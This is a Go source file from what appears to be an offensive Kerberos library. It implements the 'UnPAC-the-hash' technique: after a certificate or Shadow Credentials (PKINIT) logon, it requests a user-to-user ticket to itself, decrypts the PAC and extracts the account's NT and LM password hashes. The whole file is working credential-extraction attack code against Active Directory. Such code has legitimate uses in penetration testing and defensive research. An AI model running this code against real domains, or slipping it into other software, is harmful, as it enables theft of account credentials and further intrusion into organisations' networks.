package kerberos

import (
	"encoding/asn1"
	"fmt"

	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/pac"
)

// UnPACTheHash recovers the account's NTLM secrets from the PAC after a PKINIT
// (certificate / Shadow Credentials) logon — the "UnPAC-the-hash" technique.
//
// A PKINIT-issued PAC carries a PAC_CREDENTIAL_INFO buffer holding the account's
// NT hash, encrypted under the PKINIT-derived AS reply key. That buffer lives in
// the TGT (encrypted to the KDC), so it cannot be read directly; instead this
// method requests a user-to-user (ENC-TKT-IN-SKEY) service ticket to the account
// itself, which the KDC encrypts under the client's own TGT session key. It
// decrypts that ticket, extracts the PAC, then decrypts PAC_CREDENTIAL_INFO with
// the reply key and parses the NTLM_SUPPLEMENTAL_CREDENTIAL.
//
// GetTGT must have succeeded over PKINIT (see WithPKINIT) so the reply key is
// available. Returns the recovered LM and NT hashes (LM may be nil).
func (c *KerberosClient) UnPACTheHash() (lmHash, ntHash []byte, err error) {
	if !c.hasTGT {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: no TGT: call GetTGT first")
	}
	if len(c.pkinitReplyKey) == 0 {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash requires a PKINIT logon (no reply key available)")
	}

	// U2U service ticket to self, encrypted under our own TGT session key.
	ticket, _, _, err := c.GetTGSU2U(c.username, "", c.tgtTicketRaw)
	if err != nil {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: U2U to self: %w", err)
	}

	plain, err := kerbcrypto.Decrypt(c.sessionEType, c.sessionKey, kerbcrypto.KeyUsageKDCRepTicket, ticket.EncPart.Cipher)
	if err != nil {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: decrypt U2U ticket: %w", err)
	}
	var enc messages.EncTicketPart
	if _, err := enc.Unmarshal(plain); err != nil {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: parse EncTicketPart: %w", err)
	}

	pacBytes := extractWin2KPAC(enc.AuthorizationData)
	if pacBytes == nil {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: no PAC in U2U ticket")
	}
	p, err := pac.Parse(pacBytes)
	if err != nil {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: parse PAC: %w", err)
	}
	buf, ok := p.Buffer(pac.BufferCredentials)
	if !ok {
		return nil, nil, fmt.Errorf("kerberos: UnPACTheHash: PAC has no PAC_CREDENTIAL_INFO (not a PKINIT-issued PAC?)")
	}

	ci, err := pac.ParseCredentialInfo(buf.Data)
	if err != nil {
		return nil, nil, err
	}
	credData, err := ci.DecryptCredentialData(c.pkinitReplyKey)
	if err != nil {
		return nil, nil, err
	}
	ntlm, err := pac.ParseNTLMSupplementalCredential(credData)
	if err != nil {
		return nil, nil, err
	}
	return ntlm.LMHash, ntlm.NTHash, nil
}

// extractWin2KPAC walks the AD-IF-RELEVANT wrapper for the AD-WIN2K-PAC element.
func extractWin2KPAC(ad []messages.AuthorizationData) []byte {
	for _, e := range ad {
		if e.ADType != adTypeIfRelevant {
			continue
		}
		var inner []messages.AuthorizationData
		if _, err := asn1.Unmarshal(e.ADData, &inner); err != nil {
			continue
		}
		for _, ie := range inner {
			if ie.ADType == adTypeWin2KPAC {
				return ie.ADData
			}
		}
	}
	return nil
}
